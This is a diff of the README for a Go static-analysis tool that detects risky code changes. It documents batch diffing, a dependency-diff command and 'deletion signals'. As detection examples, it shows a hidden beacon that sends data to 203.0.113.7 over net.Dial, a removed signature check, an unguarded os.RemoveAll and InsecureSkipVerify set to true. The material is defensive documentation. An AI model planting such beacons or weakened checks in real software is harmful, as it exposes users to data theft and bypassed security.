@@ -7,7 +7,8 @@
 
 `sfw` is a static analyzer for Go source. It builds SSA with `golang.org/x/tools/go/ssa`, rewrites each function into a canonical IR, and fingerprints the function as the SHA-256 of that IR. On top of the fingerprint:
 
-- `sfw diff` compares two files function by function. It matches renamed functions by topology and scores each change by the capabilities it newly reaches.
+- `sfw diff` compares two files function by function. It matches renamed functions by topology and scores each change by the capabilities it newly reaches and the guards, checks and security settings it removes.
+- `sfw deps diff` compares the third-party code two trees of a module compile in: changed functions, exported functions that newly reach a capability, and changed files the analysis cannot see.
 - `sfw audit` sends a diff's high-risk changes and the commit message to an LLM, which decides whether the message describes the change.
 - `sfw index` and `sfw scan` match function topologies against a signature store (PebbleDB or JSON).
 
@@ -24,6 +25,7 @@ The analysis never executes the code under test.
 - [sfw diff](#sfw-diff)
 - [Risk scoring](#risk-scoring)
 - [Detection scope](#detection-scope)
+- [sfw deps diff](#sfw-deps-diff)
 - [sfw audit](#sfw-audit)
 - [sfw index and sfw scan](#sfw-index-and-sfw-scan)
 - [Signature store](#signature-store)
@@ -34,6 +36,7 @@ The analysis never executes the code under test.
 - [Sandbox](#sandbox)
 - [GitHub Action](#github-action)
 - [Library usage](#library-usage)
+- [Development](#development)
 
 ## Install
 
@@ -55,7 +58,8 @@ Flags must come before positional arguments. The CLI parses each command with Go
 | Command | Flags (default) | Arguments | Sandboxed |
 |---------|-----------------|-----------|-----------|
 | `check` | `--strict` (false), `--scan` (false), `--db` (""), `--no-sandbox` (false) | `<file.go\|dir>` | yes |
-| `diff` | `--no-sandbox` (false) | `<old.go> <new.go>` | yes |
+| `diff` | `--no-sandbox` (false), `--batch` ("") | `<old.go> <new.go>`, or none with `--batch <pairs-file>` | yes |
+| `deps diff` | `--no-sandbox` (false) | `<old-module-dir> <new-module-dir>` | yes |
 | `audit` | `--model` (`claude-opus-5-5`), `--api-key` (""), `--api-base` (""), `--no-sandbox` (false) | `<old.go> <new.go> "<commit message>"` | yes (the diff step) |
 | `index` | `--name` (required), `--severity` (`HIGH`), `--category` (`malware`), `--db` ("") | `<file.go\|dir>` | no |
 | `scan` | `--db` (""), `--threshold` (0.75), `--exact` (false), `--deps` (false), `--deps-depth` (`direct`), `--no-sandbox` (false) | `<file.go\|dir>` | yes |
@@ -71,6 +75,8 @@ Exit codes:
 |---------|--------|--------|
 | `check` | analysis ran, even when a file failed to load (reported in that file's `error` field) | `--strict` and any file errored; fatal errors |
 | `diff` | diff produced, regardless of risk | fatal errors |
+| `diff --batch` | every pair diffed, regardless of risk | any pair failed (after printing all results); fatal errors |
+| `deps diff` | diff produced, regardless of risk | either tree failed to load; fatal errors |
 | `scan` | scan ran, regardless of alerts | fatal errors (e.g. no database) |
 | `audit` | verdict `MATCH` | verdict `LIE`, `SUSPICIOUS` or `ERROR` |
 
@@ -268,6 +274,14 @@ The pair below was produced by the code shown. The fingerprints differ, because 
 └────────────────────────────────────────────────────────────────────────────┘
 ```
 
+### Batch mode
+
+`sfw diff --batch <pairs-file>` diffs many files in one run. The pairs file holds NUL-terminated paths, alternately the old and the new version of each file (`old1\0new1\0old2\0new2\0`). An empty path or `/dev/null` stands for the absent side of an added or deleted file.
+
+The output is a JSON array with one `sfw diff` result per pair, in order. A pair that cannot be diffed (a file that does not parse, say) has an `error` field and an empty `functions` list. The command prints every result, then exits 1 with `Error: 1 of 3 file pair(s) could not be diffed` on stderr.
+
+Each result equals what `sfw diff` prints for that pair alone. The difference is loading: the files of one side that share a module root (the nearest `go.mod`) are loaded with one `go/packages` call, so a package and its imports are type-checked once however many of its files changed. A file outside any module, a file the module's default build excludes (see [Files](#files)), a file in a package that does not type-check, and every file of a group whose load fails are loaded on their own, as `sfw diff` loads them. The old and new sides load concurrently.
+
 ## Risk scoring
 
 `pkg/api/risk.go` scores each `modified`, `renamed` and `added` function. A change is high-risk at a score of 10 (`RiskScoreHigh`) or more; `high_risk_changes` counts such changes, and `sfw audit` sends exactly those to the LLM.
@@ -290,7 +304,9 @@ score = min(base + structural, 9) + escalation        base = 5 for an added func
 | New goroutine (`go` statement where there was none) | 10 |
 | String-literal entropy class rises into HIGH or PACKED | 10 |
 | Obfuscation class rises to MODERATE or HIGH | 10 |
-| A verification call present in the old version is gone (`RemovedCheck`) | 10 |
+| A verification call or check helper present in the old version is gone (`RemovedCheck`) | 10 |
+| A capability call whose old call sites all ran under a condition now runs unconditionally (`Unguarded`) | 10 |
+| A security setting that weakens on its own appears, or one whose removal weakens disappears (`WeakenedSecurity`) | 10 |
 
 The +5 row does not reach the threshold on its own: adding `net.Listen` to a function that already called `net.Dial` scores 5.
 
@@ -304,7 +320,66 @@ The +5 row does not reach the threshold on its own: adding `net.Listen` to a fun
 | New `defer` | 2 |
 | New `panic` | 3 |
 
-Removed calls, loops and branches are labelled (`Calls-1`, `Loops-1`, `Branches-1`) but score nothing. An entropy increase greater than 1.0 is labelled `Entropy+x.x` without points. A changed string-literal list is labelled `StringLiterals~`.
+Removed calls, loops, branches and error exits are labelled (`Calls-1`, `Loops-1`, `Branches-1`, `ErrorExits-1`) but score nothing. An entropy increase greater than 1.0 is labelled `Entropy+x.x` without points. A changed string-literal list is labelled `StringLiterals~`.
+
+### Deletion signals
+
+A change can make code more dangerous by removing something. Four signals look for that. In the example below, the new version drops a signature check, an authorization test and a TLS setting:
+
+```go
+// old.go                                         // new.go (validSignature unchanged)
+func validSignature(msg, sig, key []byte) bool {
+	m := hmac.New(sha256.New, key)
+	m.Write(msg)
+	return hmac.Equal(sig, m.Sum(nil))
+}
+
+func Accept(msg, sig, key []byte) error {         func Accept(msg, sig, key []byte) error {
+	if !validSignature(msg, sig, key) {               return nil
+		return errors.New("bad signature")        }
+	}
+	return nil
+}
+
+func Purge(user, dir string) error {              func Purge(user, dir string) error {
+	if user != "admin" {                              return os.RemoveAll(dir)
+		return errors.New("forbidden")            }
+	}
+	return os.RemoveAll(dir)
+}
+
+func Client() *tls.Config {                       func Client() *tls.Config {
+	return &tls.Config{MinVersion: tls.VersionTLS12}  return &tls.Config{MinVersion: tls.VersionTLS12, InsecureSkipVerify: true}
+}                                                 }
+```
+
+`sfw diff` scores each of the three at 10:
+
+| Function | `topology_delta` |
+|----------|------------------|
+| `Accept` | `RemovedCheck(command-line-arguments.validSignature), Calls-2, ErrorExits-1, Branches-1, StringLiterals~` |
+| `Purge` | `Unguarded(os.RemoveAll), Calls-1, ErrorExits-1, Branches-1, StringLiterals~` |
+| `Client` | `WeakenedSecurity(crypto/tls.Config.InsecureSkipVerify=true)` |
+
+**`RemovedCheck`:** a key of the old function's `Checks` is missing from the new one's. `Checks` holds the calls that verify something:
+- the verification primitives listed under [Capability classes](#capability-classes);
+- *check helpers:* static calls to a function of the same package that reaches a primitive through at most 3 levels of static calls within that package (`validSignature` above);
+- calls whose name contains a word that starts with `auth`, `verif`, `valid`, `permi`, `allow`, `admin`, `acl`, `csrf`, `xsrf`, `signature`, `privilege`, `owner`, `role` or `access` (`authorize`, `isAdmin`, `checkPermission`; words split at camelCase and `_`), when the result decides a branch or is returned. Interface methods count (`(example.com/p.Verifier).Verify`).
+
+**`Unguarded`:** for each capability call target, `CapabilityGuards` records the fewest conditional branches any of its call sites is control-dependent on. A call site is control-dependent on a two-way branch when one outcome of the branch guarantees that the call runs and the other does not. Loop conditions are not guards. Calls that do not return (`os.Exit`, `runtime.Goexit`, `log.Fatal*` and `log.Panic*` and their `*log.Logger` methods, `testing` `Fatal*`, `FailNow` and `Skip*`) end the function like a return. `Unguarded` fires only when the old count was at least 1 and the new count is 0. The count is of direct dependences: in `if a { if b { call() } }` the call depends on `b` alone, and `if a || b { call() }` gives 2, so deleting one of several guards does not fire. A function with more than 2000 blocks records no guards.
+
+**`WeakenedSecurity`:** constant stores to these fields, and one call:
+
+| Weakens on its own (`WeakSettings`) | Weakens when removed (`SecureSettings`) |
+|-------------------------------------|-----------------------------------------|
+| `tls.Config.InsecureSkipVerify = true` | `tls.Config.ClientAuth = RequireAndVerifyClientCert` |
+| `tls.Config.MinVersion` or `MaxVersion` below TLS 1.2 | `http.Cookie.Secure = true` |
+| `http.Cookie.SameSite = SameSiteNoneMode` | `http.Cookie.HttpOnly = true` |
+| a call to `ssh.InsecureIgnoreHostKey` (`golang.org/x/crypto/ssh`) | |
+
+A new weak setting is reported as is; a lost secure setting carries a `-` prefix (`WeakenedSecurity(-net/http.Cookie.Secure=true)`). A non-constant value records nothing.
+
+**`ErrorExits-N`:** `ErrorExits` counts two-way branches with exactly one side that ends the function with a failure: a `panic`, a call that does not return, `http.Error`, `http.NotFound` or `WriteHeader` with a constant status of 400 or more, or the return of a failure error. A failure error is a new one (`errors.New`, `errors.Join`, `fmt.Errorf`, a concrete type converted to `error`), a package-level error variable, or the value the branch just tested as non-nil (`if err != nil { return err }`). A drop is labelled and not scored: error handling is often refactored away legitimately.
 
 ### Capability classes
 
@@ -334,7 +409,8 @@ Closures and range-over-func loop bodies are separate functions (`Handle$1`) and
 **Scored:**
 - A function newly reaching one of the capability classes above through a concrete call target. This includes replacing one call with another while the call count stays the same (`fmt.Println` → `net.Dial` scores 20).
 - `reflect.Value.Call` and `CallSlice`, which are scored as the `reflection` capability.
-- Removal of a verification call, or deletion of a function that made one.
+- Removal of a verification call or a check helper, or deletion of a function that made one.
+- A capability call left without any guard, and weakened security settings (see [Deletion signals](#deletion-signals)).
 - New goroutines, entropy class increases and obfuscation class increases.
 
 **Not scored (no concrete target):**
@@ -344,10 +420,93 @@ Closures and range-over-func loop bodies are separate functions (`Handle$1`) and
 These appear in `CallSignatures` but not in `CallTargets`, so they never reach the capability classifier.
 
 **Not scored (other limits):**
-- **Plain-conditional guards:** removing one (`if user != admin`, a bounds check, a TLS config field) shows up as `Branches-N` and changed literals in `removed_ops`, and scores 0.
+- **Guards around ordinary code:** removing a condition (`if user != admin`, a bounds check) scores only when it leaves a capability call unconditional, removes a check, or weakens a listed setting. Otherwise it shows up as `Branches-N`, `ErrorExits-N` and changed literals in `removed_ops`, and scores 0. Deleting one of several guards of a capability call scores 0 as well.
+- **Check helpers in other packages:** a helper is found only through calls within the function's own package, or by its name.
 - **Filesystem calls outside the list:** `os.Mkdir`, `os.MkdirAll`, methods on `*os.File` and `ioutil.WriteFile` are not in the `filesystem` class.
 - **Package-level payloads:** a package-level `var` initializer lives in the package `init` function, so its literal is attributed to `init`, not to the function that uses it.
 - **Parse failures:** in `sfw diff`, a file that fails to type-check is a fatal error. In `sfw check`, it is a per-file `error` entry.
+
+## sfw deps diff
+
+`sfw deps diff <old-dir> <new-dir>` compares the third-party code compiled into two trees of a module, such as a pull request's base and head. Each tree is loaded with `./...` and the [loader environment](#fingerprint-pipeline), so every module either build needs must already be in the module cache: run `go mod download` in both trees first.
+
+A module is compared when its version or replacement differs between the trees, or when it is replaced by a local directory in both, since a local directory can change without a version change. A module in only one tree is `added` or `removed`.
+
+Example: `example.com/app` replaces `example.com/codec` with `../codec`. The new `codec` hides a beacon behind its existing exported `Decode` and adds a `//go:linkname` directive:
+
+```go
+// codec.go, new                                        // time.go, new file
+func Decode(data []byte) string { return normalize(string(data)) }    //go:linkname nanotime runtime.nanotime
+                                                                      func nanotime() int64
+func normalize(s string) string {
+	go report(s)
+	return strings.TrimSpace(s)
+}
+
+func report(s string) {
+	if c, err := net.Dial("tcp", "203.0.113.7:443"); err == nil {
+		c.Write([]byte(s))
+	}
+}
+```
+
+`sfw deps diff --no-sandbox old/app new/app` prints this (the `init` entry, fingerprints and ops are cut):
+
+```json
+{
+  "old_dir": "old/app",
+  "new_dir": "new/app",
+  "summary": { "modules_updated": 1, "modules_added": 0, "modules_removed": 0, "functions_changed": 3, "high_risk_changes": 3 },
+  "modules": [
+    {
+      "path": "example.com/codec",
+      "status": "updated",
+      "old_version": "replace ../codec",
+      "new_version": "replace ../codec",
+      "packages": [
+        {
+          "path": "example.com/codec",
+          "summary": { "total_functions": 4, "preserved": 1, "modified": 2, "added": 1, "removed": 0, "semantic_match_pct": 25, "topology_matched_pct": 75, "high_risk_changes": 1 },
+          "functions": [
+            { "function": "normalize", "status": "modified", "risk_score": 2,  "topology_delta": "Calls+1, AddedGoroutine" },
+            { "function": "report",    "status": "added",    "risk_score": 26, "topology_delta": "Capability+network(net.Dial), Branches+1, StringLiterals~, Entropy+3.3" }
+          ]
+        }
+      ],
+      "reach": [
+        { "function": "example.com/codec.Decode", "added": ["network"], "targets": ["net.Dial"], "risk_score": 20 }
+      ],
+      "unanalyzed": [
+        { "file": "time.go: //go:linkname nanotime runtime.nanotime", "kind": "linkname", "change": "added", "risk_score": 10 }
+      ],
+      "risk_score": 26,
+      "high_risk_changes": 3
+    }
+  ]
+}
+```
+
+For each compared module:
+- **`packages`:** the changed functions of each package, with the statuses and scores of `sfw diff`, except that calls into the module's own packages are not capabilities (`golang.org/x/sys` calling its own `Syscall6` is its job), and a new goroutine is labelled without points (what it runs is covered by `reach`).
+- **`reach`:** exported functions, exported methods of exported types and package initializers that can reach a capability class they could not reach before. The walk follows static calls, closures and function values through all third-party code, and classifies standard-library functions at the call; it does not follow interface or dynamic calls. The score is that of the most dangerous new class (see [Risk scoring](#risk-scoring)); an initializer, which runs on import, adds 10. A new exported function is not listed: its own entry in `packages` scores it.
+- **`unanalyzed`:** added, modified and removed files the SSA analysis cannot see, compared by SHA-256:
+
+  | `kind` | Files | Added or modified |
+  |--------|-------|-------------------|
+  | `syso`, `object` | `.syso`; `.a`, `.o`, `.so`, `.dylib`, `.dll`, `.lib` | 20 |
+  | `linkname` | each `//go:linkname` directive in compiled Go files | 10 |
+  | `assembly`, `c` | `.s`, `.sx`; C, C++, Objective-C, Fortran and SWIG sources and headers | 5 |
+  | `cgo`, `excluded-go` | Go files the build leaves out: those that import `"C"`, and those excluded by build constraints (other platforms included) | 5 |
+  | `embed` | files embedded with `//go:embed` | 5 |
+
+  Removed files score 0. Files are taken from each built package's directory, tests excluded. In a module with a cgo file, native sources, headers and object files anywhere in the module are included, since `#include` and `#cgo` directives can reach them. `go list` itself omits a cgo package's C files when cgo is disabled.
+
+A module's `risk_score` is the highest of its changes, and `high_risk_changes` counts those scoring 10 or more. An `added` module lists the capability classes its entry points can reach (`capabilities`), initializers that reach any (`reach`), and its `syso`, `object` and `linkname` files.
+
+Limits:
+- **cgo:** the loader disables cgo. A dependency package with no Go files left without cgo fails to load, and `sfw deps diff` exits 1. C code is hashed, not analyzed.
+- **Load errors are fatal:** any package error in either tree (a missing module, a type error) fails the command, rather than producing a partial diff.
+- **Sandbox mounts:** under the sandbox, only the trees, their module and `.git` roots and the module cache are visible; a local `replace` directory outside them does not load. Use `--no-sandbox` for such a tree.
 
 ## sfw audit
 
@@ -740,7 +899,10 @@ Two instructions are equivalent when all of the following hold:
 | `CallSignatures` | call profile by package name (table below) |
 | `CallTargets` | concrete callees by import path |
 | `Capabilities` | call target → capability class |
-| `Checks` | verification-call targets |
+| `Checks` | verification calls and check helpers (see [Deletion signals](#deletion-signals)) |
+| `CapabilityGuards` | capability call target → fewest conditional branches any of its call sites depends on |
+| `WeakSettings`, `SecureSettings` | security settings the function writes (see [Deletion signals](#deletion-signals)) |
+| `ErrorExits` | two-way branches with exactly one side ending the function with a failure |
 | `BinOpCounts`, `UnOpCounts`, `InstrCounts` | operator and instruction-type histograms |
 | `HasDefer`, `HasPanic`, `HasGo`, `HasSelect` | control-flow flags |
 | `HasRange` | true only for `range` over a map or string |
@@ -905,17 +1067,19 @@ The Action does the following before running `sfw`:
 - installs `runsc` release `20260126.0` and checks its SHA-512;
 - relaxes the AppArmor user-namespace restriction for it.
 
-`diff` and `audit` analyze every `.go` file changed between a base and `HEAD`, and ignore `path`. The base is `origin/<base branch>` for a pull request, the `before` commit for a push, and `HEAD~1` otherwise. In `diff` mode the job fails if `sfw diff` fails on any changed file.
+`diff` and `audit` analyze every `.go` file changed between a base and `HEAD`, and ignore `path`. The base is `origin/<base branch>` for a pull request, the `before` commit for a push, and `HEAD~1` otherwise. `diff` mode passes all changed files (except `_test.go`, `_generated.go` and `vendor/` files) to one [`sfw diff --batch`](#batch-mode) run, and fails the job if any file could not be diffed.
+
+`deps` mode runs [`sfw deps diff`](#sfw-deps-diff) on the base and `HEAD` versions of the module at `path`, which must contain `go.mod` in both. It runs only when a `go.mod` or `go.sum` changed; otherwise `result` is `{}`. It first runs `go mod download` in both trees (this fetches and verifies module zips against `go.sum`; it runs no code). With `fail-on-alert`, the job fails when `high_risk_changes` is above 0.
 
 | Input | Default | Purpose |
 |-------|---------|---------|
-| `path` | `.` | target for `check` and `scan` |
-| `mode` | `check` | `check`, `diff`, `scan` or `audit` |
+| `path` | `.` | target for `check` and `scan`; the module root for `deps` |
+| `mode` | `check` | `check`, `diff`, `deps`, `scan` or `audit` |
 | `go-version` | `1.26` | passed to `actions/setup-go` |
 | `signatures` | — | database path, required for `scan`; `.json` selects the JSON backend |
 | `threshold` | `0.75` | scan threshold |
 | `strict` | `false` | `check --strict` |
-| `fail-on-alert` | `true` | fail a `scan` with `total_alerts > 0` |
+| `fail-on-alert` | `true` | fail a `scan` with `total_alerts > 0`, or `deps` with `high_risk_changes > 0` |
 | `scan-deps` | `false` | `scan --deps` |
 | `deps-depth` | `direct` | `scan --deps-depth` |
 | `api-key` | — | exported to the provider's variable according to `model` |
@@ -928,6 +1092,7 @@ The outputs are:
 - `deps-scanned`
 - `semantic-match-pct`, the mean over changed files
 - `audit-verdict`, `PASS` or `FAIL`
+- `high-risk-changes`, from `deps` mode
 
 ## Library usage
 
